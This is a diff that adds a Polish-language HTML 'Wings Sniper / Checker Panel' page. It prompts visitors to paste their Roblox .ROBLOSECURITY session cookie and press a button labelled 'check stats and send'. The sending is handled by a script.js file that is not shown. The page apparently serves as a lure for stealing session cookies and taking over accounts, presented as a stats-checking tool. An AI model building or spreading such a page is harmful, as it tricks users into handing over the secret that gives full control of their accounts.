@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+    <meta charset="utf-8">
+    <title>Wings Sniper - Web Panel</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            font-family: 'Segoe UI', system-ui, sans-serif;
+            background-color: #0d0d0d;
+            color: #e6edf3;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .card {
+            width: 420px;
+            background: #111111;
+            border: 1px solid #333;
+            border-radius: 8px;
+            padding: 20px;
+            box-shadow: 0 8px 24px rgba(0,0,0,0.5);
+        }
+        h2 { font-size: 16px; margin-bottom: 12px; color: #ff6584; text-align: center; }
+        label { font-size: 11px; color: #888; display: block; margin-bottom: 5px; }
+        input[type="text"] {
+            width: 100%;
+            background: #030303;
+            border: 1px solid #444;
+            border-radius: 4px;
+            padding: 8px;
+            color: #fff;
+            font-size: 11px;
+            margin-bottom: 12px;
+            outline: none;
+        }
+        input[type="text"]:focus { border-color: #ff6584; }
+        button {
+            width: 100%;
+            background: linear-gradient(135deg, #ff6584 0%, #ff8da1 100%);
+            color: white;
+            border: none;
+            border-radius: 6px;
+            padding: 10px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+        button:hover { filter: brightness(1.1); }
+        pre {
+            background: #030303;
+            border: 1px solid #222;
+            border-radius: 4px;
+            padding: 10px;
+            font-size: 10px;
+            color: #00ffcc;
+            margin-top: 15px;
+            height: 150px;
+            overflow-y: auto;
+            white-space: pre-wrap;
+        }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h2>Wings Sniper / Checker Panel</h2>
+        <label for="cookieInput">Wklej swoje .ROBLOSECURITY:</label>
+        <input type="text" id="cookieInput" placeholder="_|WARNING:-DO-NOT-SHARE-THIS...">
+        <button id="checkBtn">Sprawdź statystyki i wyślij</button>
+        <pre id="outputLog">Status: Oczekiwanie na dane...</pre>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
